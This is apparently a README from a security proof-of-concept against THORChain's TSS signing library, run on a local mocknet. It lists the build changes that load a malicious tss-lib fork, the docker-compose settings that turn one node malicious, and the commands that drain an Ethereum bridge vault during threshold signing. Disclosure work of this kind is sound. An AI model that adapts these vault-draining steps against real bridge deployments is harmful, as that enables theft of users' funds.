## Expliotaion
### Build
POC lib place at `./pkg/thorchain-tss-lib`. When environment variable `TSSPOC` is set, the node will become malicious node.
Changes applied to thornode and bifrost:
* Remove unnecssary chain BTC, BCH, AVAX, GAIA, LTC...
* Replace `github.com/binance-chain/tss-lib` with `./pkg/thorchain-tss-lib` in `thornode/go.mod`


### Steps
1. Deploy testnet environment thorchain, bifrost bridge, ethereum. Modify docker-compose.yml:
  * add environment `TSSPOC: "tsspoc"` to node cat in both `thornode-cat` and `bifrost-cat`
  * map file `malicious_params.txt` for containers `thornode-cat` and `bifrost-cat`: 
  ```
  services:
    bifrost-cat:
      ...
      environment:
        - TSSPOC: "tsspoc"
      volumes:
        /malicious_params.txt:/malicious_params.txt
      ...
  ```
Run the mocknet cluster: 5 thornode, 5 bifrost, 1 ethereum node

```bash
  make run-mocknet-cluster
```

2. Modify smoke python script `thornode/test/smoke` and bootstrap transaction in `thornode/test/smoke/data/smoke_test_transactions.json`
Run bootstrap scripts to set up the vault and tokens.

```bash 
  make bootstrap-mocknet
```
3. Run the exploitation: check the vault balances and drain the vault
```bash
cd web3-client
node index.js vault
node index.js drain 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf
```
open a thorchain client, make a swap to trigger threshold signing using `acc1`
```bash
make cli-mocknet
thornode tx thorchain deposit 50000000 THOR.RUNE SWAP:ETH.ETH:0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf --from=acc1 $TX_FLAGS 
```
